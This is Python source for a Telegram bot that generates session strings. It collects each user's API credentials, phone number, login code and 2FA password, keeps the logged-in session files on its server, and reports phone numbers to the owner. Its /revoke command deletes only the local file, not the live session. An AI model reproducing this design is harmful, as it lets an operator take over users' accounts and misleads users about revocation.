import os
import logging
import sqlalchemy as db
from sqlalchemy.orm import declarative_base, Session
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler
)
from telethon.sync import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError
)

# Load environment variables
load_dotenv()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
Base = declarative_base()
engine = db.create_engine(os.getenv("DATABASE_URL"))

class User(Base):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    banned = db.Column(db.Boolean, default=False)
    sessions = db.Column(db.Integer, default=0)

Base.metadata.create_all(engine)

# Conversation states
API_ID, API_HASH, PHONE, OTP, TWOFA = range(5)

def is_owner(user_id: int) -> bool:
    return str(user_id) == os.getenv("OWNER_ID")

async def check_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    with Session(engine) as session:
        user = session.get(User, update.effective_user.id)
        if user and user.banned:
            await update.message.reply_text("🚫 You are banned from using this bot!")
            return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_ban(update, context):
        return
    
    user = update.effective_user
    welcome_msg = (
        f"👋 Welcome {user.first_name}!\n"
        f"📛 Username: @{user.username}\n"
        f"🆔 Your ID: {user.id}\n\n"
        "Use /cmds to see available commands"
    )
    await update.message.reply_text(welcome_msg)

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_ban(update, context):
        return
    
    commands = [
        "/start - Start the bot",
        "/cmds - Show commands",
        "/genstring - Generate session",
        "/revoke - Revoke session"
    ]
    
    if is_owner(update.effective_user.id):
        commands.extend([
            "/broadcast - Broadcast message",
            "/stats - Bot statistics",
            "/ban [id] - Ban user",
            "/unban [id] - Unban user",
            "/maintenance - Toggle maintenance"
        ])
    
    await update.message.reply_text("\n".join(commands))

async def genstring_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_ban(update, context):
        return ConversationHandler.END
    
    await update.message.reply_text("Enter your API_ID (numbers only):")
    return API_ID

async def api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data['api_id'] = int(update.message.text)
        await update.message.reply_text("Now enter your API_HASH:")
        return API_HASH
    except ValueError:
        await update.message.reply_text("Invalid API_ID! Numbers only. Try again:")
        return API_ID

async def api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['api_hash'] = update.message.text
    await update.message.reply_text("Enter phone number (with country code):")
    return PHONE

async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        code = await client.send_code_request(context.user_data['phone'])
        context.user_data['phone_code_hash'] = code.phone_code_hash
        await update.message.reply_text("Enter the OTP you received:")
        return OTP
    except Exception as e:
        await handle_error(update, e)
        return ConversationHandler.END

async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['otp'] = update.message.text
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        await client.sign_in(
            phone=context.user_data['phone'],
            code=context.user_data['otp'],
            phone_code_hash=context.user_data['phone_code_hash']
        )
        
        string_session = client.session.save()
        await client.disconnect()
        await update.message.reply_text(f"✅ Session generated:\n`{string_session}`", parse_mode='Markdown')
        await log_to_owner(update, context)
        return ConversationHandler.END
    
    except SessionPasswordNeededError:
        await update.message.reply_text("Enter your 2FA password:")
        return TWOFA
    except Exception as e:
        await handle_error(update, e)
        return ConversationHandler.END

async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        await client.sign_in(password=update.message.text)
        string_session = client.session.save()
        await client.disconnect()
        
        await update.message.reply_text(f"✅ Session generated:\n`{string_session}`", parse_mode='Markdown')
        await log_to_owner(update, context)
        return ConversationHandler.END
    except Exception as e:
        await handle_error(update, e)
        return ConversationHandler.END

async def log_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    owner_id = int(os.getenv("OWNER_ID"))
    user_data = context.user_data
    user = update.effective_user
    
    log_msg = (
        "⚠️ New Session Generated\n"
        f"User: {user.mention_markdown()}\n"
        f"ID: `{user.id}`\n"
        f"Phone: `{user_data.get('phone', '')}`\n"
        f"API_ID: `{user_data.get('api_id', '')}`\n"
        f"2FA Used: {'✅' if 'twofa' in user_data else '❌'}"
    )
    
    await context.bot.send_message(
        chat_id=owner_id,
        text=log_msg,
        parse_mode='MarkdownV2'
    )

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session_file = f"sessions/{user_id}"
    
    if os.path.exists(session_file):
        os.remove(session_file)
        await update.message.reply_text("✅ Session revoked successfully!")
    else:
        await update.message.reply_text("No active session found!")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    
    try:
        target_id = int(context.args[0])
        with Session(engine) as session:
            user = session.get(User, target_id) or User(id=target_id)
            user.banned = True
            session.add(user)
            session.commit()
        
        await update.message.reply_text(f"✅ User {target_id} banned!")
    except:
        await update.message.reply_text("Usage: /ban [user_id]")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    
    try:
        target_id = int(context.args[0])
        with Session(engine) as session:
            user = session.get(User, target_id)
            if user:
                user.banned = False
                session.commit()
                await update.message.reply_text(f"✅ User {target_id} unbanned!")
            else:
                await update.message.reply_text("User not found!")
    except:
        await update.message.reply_text("Usage: /unban [user_id]")

async def handle_error(update: Update, error: Exception):
    error_msg = f"❌ Error: {str(error)}\n\nContact @rishabh_zz for support"
    await update.message.reply_text(error_msg)
    logger.error(f"Error: {str(error)}")

def main():
    application = ApplicationBuilder().token(os.getenv("BOT_TOKEN")).build()
    
    # Create sessions directory if not exists
    if not os.path.exists("sessions"):
        os.makedirs("sessions")
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('genstring', genstring_start)],
        states={
            API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_id)],
            API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_hash)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp)],
            TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa)]
        },
        fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)],
        allow_reentry=True
    )
    
    # Add handlers
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('cmds', cmds))
    application.add_handler(CommandHandler('revoke', revoke))
    application.add_handler(conv_handler)
    
    # Owner commands
    application.add_handler(CommandHandler('ban', ban))
    application.add_handler(CommandHandler('unban', unban))
    
    application.run_polling()

if __name__ == '__main__':
    main()
